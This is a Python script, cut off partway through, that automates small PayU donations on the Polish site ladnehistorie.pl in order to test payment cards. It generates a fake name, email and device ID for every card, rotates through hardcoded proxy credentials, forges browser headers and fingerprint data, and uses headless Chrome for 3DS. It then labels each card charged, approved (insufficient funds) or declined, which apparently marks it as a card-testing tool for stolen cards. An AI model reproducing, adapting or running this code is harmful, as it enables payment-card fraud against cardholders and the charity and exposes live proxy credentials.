import requests
import re
import json
import logging
import random
import string
import time
import uuid
from urllib.parse import urlparse, parse_qs, urlencode
import zipfile
import os
import urllib3

# Suppress warnings since we use verify=False for proxies
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ColoredFormatter(logging.Formatter):
    grey     = "\x1b[38;20m"
    yellow   = "\x1b[33;20m"
    red      = "\x1b[31;20m"
    green    = "\x1b[32;20m"
    blue     = "\x1b[34;20m"
    bold_red = "\x1b[31;1m"
    cyan     = "\x1b[36;20m"
    magenta  = "\x1b[35;20m"
    reset    = "\x1b[0m"

    def format(self, record):
        msg = record.getMessage()
        lvl = record.levelname
        if lvl == "DEBUG":       color = self.blue
        elif lvl == "WARNING":   color = self.yellow
        elif lvl == "ERROR":     color = self.red
        elif lvl == "CRITICAL":  color = self.bold_red
        else:                    color = self.grey
        if "RESPONSE" in msg or "Status Code" in msg: color = self.green
        if "proxy" in msg.lower() or "PROXY" in msg:  color = self.cyan
        if "STEP" in msg or "STARTING" in msg:        color = self.magenta
        record.levelname = f"{color}{lvl}{self.reset}"
        return super().format(record)

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%H:%M:%S',
)
logger = logging.getLogger(__name__)
for handler in logger.handlers:
    handler.setFormatter(ColoredFormatter('%(asctime)s - %(levelname)s - %(message)s'))


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY POOL
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PROXY_LIST = [
    {"host": "31.59.20.176",    "port": 6754, "username": "wtvdwams", "password": "z3jfr2x3c38b", "tag": "Proxy-1"},
    {"host": "198.23.239.134",  "port": 6540, "username": "wtvdwams", "password": "z3jfr2x3c38b", "tag": "Proxy-2"},
    {"host": "45.38.107.97",    "port": 6014, "username": "wtvdwams", "password": "z3jfr2x3c38b", "tag": "Proxy-3"},
    {"host": "107.172.163.27",  "port": 6543, "username": "wtvdwams", "password": "z3jfr2x3c38b", "tag": "Proxy-4"},
    {"host": "198.105.121.200", "port": 6462, "username": "wtvdwams", "password": "z3jfr2x3c38b", "tag": "Proxy-5"},
    {"host": "216.10.27.159",   "port": 6837, "username": "wtvdwams", "password": "z3jfr2x3c38b", "tag": "Proxy-6"},
    {"host": "142.111.67.146",  "port": 5611, "username": "wtvdwams", "password": "z3jfr2x3c38b", "tag": "Proxy-7"},
    {"host": "191.96.254.138",  "port": 6185, "username": "wtvdwams", "password": "z3jfr2x3c38b", "tag": "Proxy-8"},
    {"host": "31.58.9.4",       "port": 6077, "username": "wtvdwams", "password": "z3jfr2x3c38b", "tag": "Proxy-9"},
    {"host": "198.46.161.42",   "port": 5092, "username": "wtvdwams", "password": "z3jfr2x3c38b", "tag": "Proxy-10"},
]


class ProxyRotator:
    def __init__(self, proxies, mode="sequential"):
        self.proxies = list(proxies)
        self.mode = mode
        self.index = 0
        self.usage_count = 0
        if mode == "shuffle":
            random.shuffle(self.proxies)

    def get_next(self):
        proxy = self.proxies[self.index % len(self.proxies)]
        self.index += 1
        self.usage_count += 1
        return proxy

    def get_proxy_url(self, proxy):
        u, p = proxy['username'], proxy['password']
        return f"http://{u}:{p}@{proxy['host']}:{proxy['port']}"

    def get_proxies_dict(self, proxy):
        url = self.get_proxy_url(proxy)
        return {'http': url, 'https': url}

    def get_stats(self):
        return {
            "total_proxies": len(self.proxies),
            "current_index": self.index % len(self.proxies),
            "total_uses": self.usage_count,
            "mode": self.mode,
        }


proxy_rotator = ProxyRotator(PROXY_LIST, mode="sequential")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# NAME / EMAIL GENERATORS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

FIRST_NAMES = [
    "John","Jane","Michael","Emily","David","Sarah","Robert","Lisa","James","Mary",
    "William","Patricia","Thomas","Jennifer","Charles","Linda","Christopher","Elizabeth",
    "Daniel","Barbara","Matthew","Susan","Anthony","Jessica","Mark","Karen","Steven",
    "Nancy","Andrew","Betty","Kevin","Dorothy","Brian","Sandra","George","Ashley",
    "Timothy","Kimberly","Ronald","Donna","Edward","Michelle","Jason","Carol","Jeffrey",
    "Amanda","Ryan","Melissa","Jacob","Deborah","Gary","Stephanie","Eric","Rebecca",
    "Jonathan","Sharon","Stephen","Laura","Larry","Cynthia","Justin","Kathleen","Scott",
    "Amy","Brandon","Angela","Benjamin","Shirley","Samuel","Anna","Raymond","Brenda",
    "Gregory","Pamela","Frank","Emma","Alexander","Nicole","Patrick","Helen","Jack",
    "Samantha","Dennis","Katherine","Jerry","Christine","Tyler","Debra","Aaron","Rachel",
    "Jose","Carolyn","Adam","Janet","Nathan","Catherine","Henry","Maria","Douglas","Heather",
    "Peter","Diane","Zachary","Ruth",
]

LAST_NAMES = [
    "Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez",
    "Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore",
    "Jackson","Martin","Lee","Perez","Thompson","White","Harris","Sanchez","Clark","Ramirez",
    "Lewis","Robinson","Walker","Young","Allen","King","Wright","Scott","Torres","Nguyen",
    "Hill","Flores","Green","Adams","Nelson","Baker","Hall","Rivera","Campbell","Mitchell",
    "Carter","Roberts","Gomez","Phillips","Evans","Turner","Diaz","Parker","Cruz","Edwards",
    "Collins","Reyes","Stewart","Morris","Morales","Murphy","Cook","Rogers","Gutierrez",
    "Ortiz","Morgan","Cooper","Peterson","Bailey","Reed","Kelly","Howard","Ramos","Kim",
    "Cox","Ward","Richardson","Watson","Brooks","Chavez","Wood","James","Bennett","Gray",
    "Mendoza","Ruiz","Hughes","Price","Alvarez","Castillo","Sanders","Patel","Myers",
    "Long","Ross","Foster","Jimenez","Powell",
]

EMAIL_DOMAINS = [
    "gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com",
    "icloud.com","aol.com","mail.com","zoho.com","yandex.com",
]


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PAYU PROCESSOR — ladnehistorie.pl
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class PayUProcessor:
    # ── Site config ──────────────────────────────────────────────────
    DONATION_SITE_URL = "https://ladnehistorie.pl/en/support-us/"
    DONATION_FORM_ID  = "5827"
    DONATION_AMOUNT   = "1"                      # amount string for the WP form

    # Cookies observed from a.js (consent / analytics)
    _COOKIES = {
        'cookieyes-consent': (
            'consentid:Vzd3aFdxcUJKUzlrOTlXeEtZU1YwZE9ia0Z2TFRhNkM,'
            'consent:yes,action:yes,necessary:yes,functional:yes,'
            'analytics:yes,performance:yes,advertisement:yes,other:yes'
        ),
        'wp_consent_preferences': 'allow',
        'wp_consent_statistics': 'allow',
        'wp_consent_statistics-anonymous': 'allow',
        'wp_consent_functional': 'allow',
        'wp_consent_marketing': 'allow',
    }

    _UA = (
        'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) '
        'AppleWebKit/537.36 (KHTML, like Gecko) '
        'Chrome/146.0.0.0 Mobile Safari/537.36'
    )

    def __init__(self, proxy_info=None):
        self.session = requests.Session()
        self.proxy_info = proxy_info or proxy_rotator.get_next()
        self.session.proxies.update(proxy_rotator.get_proxies_dict(self.proxy_info))
        self.session.verify = False

        self.order_id      = None
        self.payment_token = None
        self.card_token    = None
        self.bearer_token  = None
        self.continue_url  = None
        self.payment_status = None
        self.redirect_url  = None
        self.email         = None
        self.first_name    = None
        self.last_name     = None
        self.card_number   = None
        self.cvv           = None
        self.exp_month     = None
        self.exp_year      = None
        self.device_id     = None
        self.driver        = None
        self.threeds_timeout = 23
        self._log_proxy()

    def _log_proxy(self):
        tag  = self.proxy_info.get('tag', 'UNKNOWN')
        host = self.proxy_info['host']
        port = self.proxy_info['port']
        stats = proxy_rotator.get_stats()
        logger.info(
            f"PROXY: [{tag}] {host}:{port}  "
            f"(rotation {stats['current_index'] + 1}/{stats['total_proxies']}, "
            f"total uses: {stats['total_uses']})"
        )

    # ── Generators ───────────────────────────────────────────────────
    def generate_random_string(self, length=10):
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def generate_random_email(self):
        username = self.generate_random_string(random.randint(7, 12))
        domain   = random.choice(EMAIL_DOMAINS)
        self.email = f"{username}@{domain}"
        return self.email

    def generate_random_name(self):
        self.first_name = random.choice(FIRST_NAMES)
        self.last_name  = random.choice(LAST_NAMES)
        return self.first_name, self.last_name

    def generate_device_id(self):
        self.device_id = str(uuid.uuid4())
        return self.device_id

    # ── Card parsing & validation ─────────────────────────────────────
    def validate_card_number(self, card_number):
        card_number = card_number.replace(' ', '').replace('-', '')
        if not card_number.isdigit() or not (13 <= len(card_number) <= 19):
            return False
        total = 0
        for i, digit in enumerate(card_number[::-1]):
            d = int(digit)
            if i % 2 == 1:
                d *= 2
                if d > 9:
                    d = (d // 10) + (d % 10)
            total += d
        return total % 10 == 0

    def parse_card_details(self, card_details_str):
        logger.info(f"Parsing card: {card_details_str[:6]}{'*'*20}{card_details_str[-4:]}")
        try:
            parts = card_details_str.split('|')
            if len(parts) != 4:
                return False, "Invalid format. Use: number|mm|yy|cvv"

            self.card_number = parts[0].strip().replace(' ', '').replace('-', '')
            self.exp_month   = parts[1].strip().zfill(2)
            self.exp_year    = parts[2].strip()
            if len(self.exp_year) == 2:
                self.exp_year = "20" + self.exp_year
            self.cvv = parts[3].strip()

            if not self.validate_card_number(self.card_number):
                return False, "CARD_NUMBER_ERROR"

            is_amex = self.card_number.startswith('3') and len(self.card_number) == 15
            if not is_amex and len(self.cvv) != 3:
                return False, "CVV must be 3 digits for Visa/Mastercard"
            if is_amex and len(self.cvv) != 4:
                return False, "CVV must be 4 digits for Amex"

            month = int(self.exp_month)
            if not (1 <= month <= 12):
                return False, "INVALID_EXPIRY"
            if int(self.exp_year) < int(time.strftime("%Y")):
                return False, "INVALID_EXPIRY"

            brand = "Amex" if is_amex else "Visa/MC"
            logger.info(
                f"Card OK [{brand}]: {self.card_number[:6]}******{self.card_number[-4:]} "
                f"| {self.exp_month}/{self.exp_year} | CVV:{'*'*len(self.cvv)}"
            )
            return True, "Success"
        except Exception as e:
            return False, str(e)

    # ── Logging helper ────────────────────────────────────────────────
    def log_response(self, response, context=""):
        logger.info(f"{'='*60}")
        logger.info(f"RESPONSE - {context}")
        logger.info(f"{'='*60}")
        logger.info(f"Status Code: {response.status_code}")
        logger.info(f"URL: {response.url}")
        try:
            json_data = response.json()
            logger.info(f"Body (JSON): {json.dumps(json_data, indent=2)}")
        except Exception:
            body = response.text
            logger.info(f"Body: {body[:1000]}{'...' if len(body) > 1000 else ''}")
        logger.info(f"{'='*60}")

    # ──────────────────────────────────────────────────────────────────
    # STEP 1 — POST donation form → get PayU redirect URL
    # Source: a.js  (ladnehistorie.pl form)
    # ──────────────────────────────────────────────────────────────────
    def start_payment(self):
        logger.info("STEP 1 — POST donation form to ladnehistorie.pl ...")

        cookie_str = '; '.join(f"{k}={v}" for k, v in self._COOKIES.items())

        headers = {
            'accept': (
                'text/html,application/xhtml+xml,application/xml;q=0.9,'
                'image/avif,image/webp,image/apng,*/*;q=0.8,'
                'application/signed-exchange;v=b3;q=0.7'
            ),
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://ladnehistorie.pl',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'referer': self.DONATION_SITE_URL,
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': self._UA,
            'cookie': cookie_str,
        }

        # Replicate exactly the form body from a.js
        # flexible_donation[terms] is sent as two values: 'no' then 'yes'
        form_parts = [
            ('flexible_donation[first_name]',    self.first_name),
            ('flexible_donation[last_name]',     self.last_name),
            ('flexible_donation[email]',         self.email),
            ('flexible_donation[amount]',        self.DONATION_AMOUNT),
            ('flexible_donation[comment]',       ''),
            ('flexible_donation[payment_method]','payu'),
            ('flexible_donation[terms]',         'no'),
            ('flexible_donation[terms]',         'yes'),
            ('flexible_donation[form_id]',       self.DONATION_FORM_ID),
            ('flexible_donation[send_donation]', 'Send donation'),
            ('trp-form-language',                'en'),
        ]
        body = urlencode(form_parts)

        try:
            # Do NOT follow redirects so we can read the Location header
            response = self.session.post(
                self.DONATION_SITE_URL,
                data=body,
                headers=headers,
                allow_redirects=False,
                timeout=30,
            )
        except Exception as e:
            logger.error(f"Donation form POST failed: {e}")
            return None

        logger.info(f"Donation form response: {response.status_code}")
        logger.info(f"Headers: {dict(response.headers)}")

        # Expect a 3xx redirect to PayU
        redirect_url = response.headers.get('location') or response.headers.get('Location')

        if not redirect_url:
            # Try following redirects manually if server returned 200 with meta-refresh
            body_text = response.text
            meta_match = re.search(r'<meta[^>]+url=(["\']?)([^"\'>\s]+)\1', body_text, re.I)
            if meta_match:
                redirect_url = meta_match.group(2)
            else:
                # Last resort: look for any PayU URL in the body
                payu_match = re.search(r'https://secure\.payu\.com[^\s"\',<>]+', body_text)
                if payu_match:
                    redirect_url = payu_match.group(0)

        if not redirect_url:
            logger.error("No redirect URL found in donation form response")
            self.log_response(response, "Donation Form POST")
            return None

        logger.info(f"PayU redirect URL: {redirect_url}")
        self.redirect_url = redirect_url

        # Extract orderId & token from the PayU URL
        parsed = urlparse(redirect_url)
        query_params = parse_qs(parsed.query)

        if 'orderId' in query_params and 'token' in query_params:
            self.order_id      = query_params['orderId'][0]
            self.payment_token = query_params['token'][0]
            self.bearer_token  = self.payment_token
            logger.info(f"Order ID: {self.order_id}")
            logger.info(f"Token:    {self.payment_token[:50]}...")
        else:
            logger.warning("orderId/token not in redirect URL yet — will extract after following redirect")

        return redirect_url

    # ──────────────────────────────────────────────────────────────────
    # STEP 2 — Follow redirect to PayU
    # ──────────────────────────────────────────────────────────────────
    def follow_redirect(self):
        logger.info("STEP 2 — Following redirect to PayU...")
        headers = {
            'accept': (
                'text/html,application/xhtml+xml,application/xml;q=0.9,'
                'image/avif,image/webp,image/apng,*/*;q=0.8,'
                'application/signed-exchange;v=b3;q=0.7'
            ),
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': self._UA,
        }

        if self.order_id and self.payment_token:
            url = f'https://secure.payu.com/pay/?orderId={self.order_id}&token={self.payment_token}'
        else:
            url = self.redirect_url

        response = self.session.get(url, headers=headers, allow_redirects=True)

        # Capture orderId/token from the final URL after any redirect chain
        final_url    = response.url
        parsed       = urlparse(final_url)
        query_params = parse_qs(parsed.query)
        if 'orderId' in query_params and 'token' in query_params:
            self.order_id      = query_params['orderId'][0]
            self.payment_token = query_params['token'][0]
            self.bearer_token  = self.payment_token
            logger.info(f"Order ID (from redirect chain): {self.order_id}")
            logger.info(f"Token    (from redirect chain): {self.payment_token[:50]}...")

        self.log_response(response, "PayU Redirect GET")
        return response

    # ──────────────────────────────────────────────────────────────────
    # STEP 3 — Get order data
    # ──────────────────────────────────────────────────────────────────
    def get_order_data(self):
        logger.info("STEP 3 — Getting order data...")
        headers = {
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'authorization': f'Bearer {self.bearer_token}',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'referer': f'https://secure.payu.com/pay/?orderId={self.order_id}&token={self.payment_token}',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': self._UA,
        }
        response = self.session.get(
            f'https://secure.payu.com/api/front/orders/{self.order_id}',
            headers=headers,
        )
        self.log_response(response, "Order Data GET")
        if response.status_code == 200:
            return response.json()
        return None

    # ──────────────────────────────────────────────────────────────────
    # STEP 4 — Tokenize card
    # ──────────────────────────────────────────────────────────────────
    def tokenize_card(self):
        logger.info("STEP 4 — Tokenizing card...")
        order_data = self.get_order_data()
        pos_id = None
        if order_data:
            pos_id = order_data.get('posId')
            logger.info(f"POS ID: {pos_id}")
        if not pos_id:
            pos_id = 'PAYU S.A.'
            logger.warning(f"Using default POS ID: {pos_id}")

        headers = {
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'authorization': f'Bearer {self.bearer_token}',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://secure.payu.com',
            'pragma': 'no-cache',
            'referer': f'https://secure.payu.com/pay/?orderId={self.order_id}&token={self.payment_token}',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': self._UA,
        }
        json_data = {
            'posId': pos_id,
            'type': 'SINGLE',
            'card': {
                'number':          self.card_number,
                'cvv':             self.cvv,
                'expirationMonth': self.exp_month,
                'expirationYear':  self.exp_year,
            },
        }
        response = self.session.post(
            'https://secure.payu.com/api/front/tokens',
            headers=headers,
            json=json_data,
        )
        self.log_response(response, "Card Tokenization POST")
        if response.status_code == 200:
            resp = response.json()
            if 'value' in resp:
                self.card_token = resp['value']
                logger.info(f"Card Token: {self.card_token[:30]}...")
                return resp
        return None

    # ──────────────────────────────────────────────────────────────────
    # STEP 5 — Make payment
    # ──────────────────────────────────────────────────────────────────
    def make_payment(self):
        logger.info("STEP 5 — Making payment...")
        order_data = self.get_order_data()
        if not order_data:
            logger.error("Failed to get order data")
            return None

        amount   = order_data.get('amount', int(self.DONATION_AMOUNT) * 100)
        currency = order_data.get('currency', 'PLN')
        logger.info(f"Amount: {amount} {currency}")

        headers = {
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'authorization': f'Bearer {self.bearer_token}',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://secure.payu.com',
            'pragma': 'no-cache',
            'referer': f'https://secure.payu.com/pay/?orderId={self.order_id}&token={self.payment_token}',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': self._UA,
        }
        masked_card = f"{self.card_number[:6]}******{self.card_number[-4:]}"
        json_data = {
            'email':     self.email,
            'firstName': self.first_name,
            'lastName':  self.last_name,
            'currency':  currency,
            'amount':    amount,
            'payMethod': {
                'type':        'c',
                'token':       self.card_token,
                'cardDetails': {'maskedCardNumber': masked_card},
            },
            'metadata':    {'cardInputTime': random.randint(1000, 5000)},
            'redirectUrl': f'https://secure.payu.com/pay/?orderId={self.order_id}&token=%token%',
            'mcpFxTableId': None,
            'mcpFxRate':    None,
            'browserData': {
                'screenWidth':        random.randint(1200, 1920),
                'javaEnabled':        False,
                'timezoneOffset':     random.randint(-120, 120),
                'screenHeight':       random.randint(800, 1080),
                'userAgent':          self._UA,
                'colorDepth':         24,
                'language':           'en-US',
                'challengeWindowSize':'04',
            },
            'language': 'en',
            'invoice':  None,
        }
        response = self.session.post(
            f'https://secure.payu.com/api/front/orders/{self.order_id}/payments',
            headers=headers,
            json=json_data,
        )
        self.log_response(response, "Payment POST")
        if response.status_code == 200:
            resp = response.json()
            if 'continueUrl' in resp and resp.get('errorCode') is None:
                self.continue_url = resp['continueUrl']
                logger.info(f"3DS Continue URL: {self.continue_url}")
            return resp
        return None

    # ──────────────────────────────────────────────────────────────────
    # STEP 6 — 3DS via headless Chrome
    # ──────────────────────────────────────────────────────────────────
    def setup_driver(self):
        try:
            from selenium import webdriver
            from selenium.webdriver.chrome.options import Options
        except ImportError:
            logger.error("Selenium not installed — 3DS handling unavailable")
            return False

        logger.info("Setting up Chrome driver...")
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--window-size=1920,1080")
        chrome_options.add_argument("--disable-extensions")
        chrome_options.add_argument("--disable-infobars")
        chrome_options.add_argument("--disable-notifications")

        proxy_host = self.proxy_info['host']
        proxy_port = self.proxy_info['port']
        proxy_user = self.proxy_info['username']
        proxy_pass = self.proxy_info['password']

        pluginfile = 'proxy_auth_plugin.zip'
        manifest_json = json.dumps({
            "version": "1.0.0",
            "manifest_version": 2,
            "name": "Chrome Proxy",
            "permissions": ["proxy","tabs","unlimitedStorage","storage","<all_urls>","webRequest","webRequestBlocking"],
            "background": {"scripts": ["background.js"]},
            "minimum_chrome_version": "22.0.0",
        })
        background_js = """
var config = {
    mode: "fixed_servers",
    rules: {singleProxy: {scheme: "http", host: "%s", port: parseInt(%s)}, bypassList: ["localhost"]}
};
chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});
function callbackFn(details) {
    return {authCredentials: {username: "%s", password: "%s"}};
}
chrome.webRequest.onAuthRequired.addListener(callbackFn, {urls: ["<all_urls>"]}, ['blocking']);
""" % (proxy_host, proxy_port, proxy_user, proxy_pass)

        with zipfile.ZipFile(pluginfile, 'w') as zp:
            zp.writestr("manifest.json", manifest_json)
            zp.writestr("background.js", background_js)
        chrome_options.add_extension(pluginfile)

        try:
            self.driver = webdriver.Chrome(options=chrome_options)
            logger.info(f"Chrome driver ready (proxy: {proxy_host}:{proxy_port})")
            return True
        except Exception as e:
            logger.error(f"Chrome setup failed: {e}")
            return False
        finally:
            if os.path.exists(pluginfile):
                try:
                    os.remove(pluginfile)
                except Exception:
                    pass

    def handle_3ds_verification(self):
        logger.info("STEP 6 — Handling 3DS verification...")
        if not self.continue_url:
            logger.error("No continue URL")
            return False
        if not self.driver:
            if not self.setup_driver():
                return False
        try:
            logger.info(f"Navigating: {self.continue_url[:80]}...")
            self.driver.get(self.continue_url)
            time.sleep(2)
            current_url = self.driver.current_url
            logger.info(f"Waiting for 3DS (timeout: {self.threeds_timeout}s)...")

            wait_time = 0
            while wait_time < self.threeds_timeout:
                time.sleep(1)
                wait_time += 1
                new_url = self.driver.current_url
                if new_url != current_url:
                    logger.info(f"3DS redirect detected: {new_url}")
                    self.driver.quit()
                    self.driver = None
                    return True
                if "secure.payu.com/pay/" in new_url:
                    logger.info(f"Returned to PayU: {new_url}")
                    self.driver.quit()
                    self.driver = None
                    return True
                if wait_time % 5 == 0:
                    logger.info(f"Still waiting... ({wait_time}/{self.threeds_timeout}s)")

            final_url = self.driver.current_url
            logger.info(f"Final 3DS URL (timed out): {final_url}")
            self.driver.quit()
            self.driver = None
            return False
        except Exception as e:
            logger.error(f"3DS error: {e}")
            if self.driver:
                self.driver.quit()
                self.driver = None
            return False

    # ──────────────────────────────────────────────────────────────────
    # STEP 7 — Check payment status
    # ──────────────────────────────────────────────────────────────────
    def check_payment_status(self, max_retries=5, retry_delay=5):
        logger.info("STEP 7 — Checking payment status...")
        headers = {
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'authorization': f'Bearer {self.bearer_token}',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'referer': f'https://secure.payu.com/pay/?orderId={self.order_id}&token={self.payment_token}',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': self._UA,
        }
        last_status = None
        for attempt in range(max_retries):
            logger.info(f"Status check {attempt+1}/{max_retries}")
            response = self.session.get(
                f'https://secure.payu.com/api/front/orders/{self.order_id}/status',
                headers=headers,
            )
            if response.status_code == 200:
                status_data = response.json()
                last_status = status_data
                self.log_response(response, f"Payment Status (attempt {attempt+1})")
                if 'category' in status_data:
                    self.payment_status = status_data['category']
                if 'continueUrl' in status_data:
                    self.continue_url = status_data['continueUrl']
                if self.payment_status == "IN_PROGRESS" and attempt < max_retries - 1:
                    logger.info(f"In progress, waiting {retry_delay}s...")
                    time.sleep(retry_delay)
                    continue
                return status_data
            else:
                self.log_response(response, f"Status Error (attempt {attempt+1})")
                if attempt < max_retries - 1:
                    time.sleep(retry_delay)
        return last_status

    # ── Status determination ──────────────────────────────────────────
    def extract_code(self, value):
        if not value:
            return "UNKNOWN"
        codes = [
            "3DS_NOT_AUTHORIZED", "REFUSED_BY_ISSUER", "AUTHORIZED",
            "3DS_METHOD_REQUIRED", "WARNING_3DS_METHOD_REQUIRED",
            "NOT_ACCEPTED", "CARD_NUMBER_ERROR", "CARD_INSUFFICIENT_FUNDS",
            "CARD_LIMIT_EXCEEDED", "INVALID_NUMBER", "MONTH_INVALID",
            "YEAR_INVALID", "CVV_ERROR", "ERROR",
        ]
        for code in codes:
            if code in value:
                return code
        return value.strip()

    def determine_status(self, status_data):
        logger.info("Determining final status...")
        if not status_data:
            return {"value": "We are unable to authorize your payment.(ERROR)", "status": "declined", "code": "ERROR"}

        value = status_data.get("value", "")
        code  = self.extract_code(value)
        logger.info(f"Status value: {value}")
        logger.info(f"Extracted code: {code}")

        if "3DS_NOT_AUTHORIZED"   in value: return {"value": "3DS challenge failed.",                                        "status": "declined", "code": code}
        if "REFUSED_BY_ISSUER"    in value: return {"value": "Bank refused the payment.",                                    "status": "declined", "code": code}
        if "AUTHORIZED"           in value and "3DS_NOT_AUTHORIZED" not in value:
                                             return {"value": "Payment authorized - successful.",                            "status": "charged",  "code": code}
        if "3DS_METHOD_REQUIRED"  in value or "WARNING_3DS_METHOD_REQUIRED" in value:
                                             return {"value": "Additional 3DS step needed.",                                 "status": "declined", "code": code}
        if "CARD_INSUFFICIENT_FUNDS" in value: return {"value": "Balance too low: insufficient funds.",                      "status": "approved", "code": code}
        if "CARD_LIMIT_EXCEEDED"  in value: return {"value": "Card spending limit hit.",                                     "status": "declined", "code": code}
        if "CARD_NUMBER_ERROR"    in value: return {"value": "Please check the card number and try again.(CARD_NUMBER_ERROR)","status": "declined", "code": code}
        if "INVALID_NUMBER"       in value: return {"value": "Please check the card number and try again.",                  "status": "declined", "code": code}
        if "MONTH_INVALID"        in value: return {"value": "Invalid expiry month.",                                        "status": "declined", "code": code}
        if "INVALID_EXPIRY"       in value: return {"value": "Invalid expiry.",                                              "status": "declined", "code": code}
        if "ERROR"                in value: return {"value": "We are unable to authorize your payment.(ERROR)",              "status": "declined", "code": code}
        if "NOT_ACCEPTED"         in value: return {"value": "Payment not accepted.",                                        "status": "declined", "code": code}
        for kw in ["3DS", "IN_PROGRESS", "DECLINED", "FAILED", "REQUIRED"]:
            if kw in value:
                return {"value": "Transaction unsuccessful.", "status": "declined", "code": code}
        for kw in ["SUCCESS", "COMPLETED"]:
            if kw in value:
                return {"value": "Payment authorized - successful.", "status": "charged", "code": code}
        return {"value": "Declined - try again.", "status": "declined", "code": code}

    # ──────────────────────────────────────────────────────────────────
    # MAIN PROCESS
    # ──────────────────────────────────────────────────────────────────
    def process(self, card_details_str):
        logger.info(f"\n{'#'*60}")
        logger.info("# STARTING PAYMENT PROCESS — ladnehistorie.pl")
        logger.info(f"{'#'*60}\n")
        try:
            success, message = self.parse_card_details(card_details_str)
            if not success:
                if message == "INVALID_EXPIRY":
                    return {"value": "Invalid expiry date.(INVALID_EXPIRY)",                              "status": "declined", "code": "INVALID_EXPIRY"}
                elif "CVV" in message:
                    return {"value": "CVV error.(CVV_ERROR)",                                              "status": "declined", "code": "CVV_ERROR"}
                elif message == "CARD_NUMBER_ERROR":
                    return {"value": "Please check the card number and try again.(CARD_NUMBER_ERROR)",     "status": "declined", "code": "CARD_NUMBER_ERROR"}
                return {"value": "We are unable to authorize your payment.(ERROR)",                        "status": "declined", "code": "ERROR"}

            # Generate fresh identity for every card
            self.generate_random_email()
            self.generate_random_name()
            self.generate_device_id()
            logger.info(f"Identity : {self.first_name} {self.last_name}")
            logger.info(f"Email    : {self.email}")
            logger.info(f"DeviceID : {self.device_id}")

            # ── STEP 1: POST donation form → PayU redirect ──
            redirect = self.start_payment()
            if not redirect:
                return {"value": "We are unable to authorize your payment.(ERROR)", "status": "declined", "code": "ERROR"}

            # ── STEP 2: Follow redirect to PayU ──
            self.follow_redirect()

            if not self.order_id or not self.payment_token:
                logger.error("Could not extract orderId/token after redirect")
                return {"value": "We are unable to authorize your payment.(ERROR)", "status": "declined", "code": "ERROR"}

            # ── STEP 3/4: Get order data + tokenize card ──
            if not self.tokenize_card():
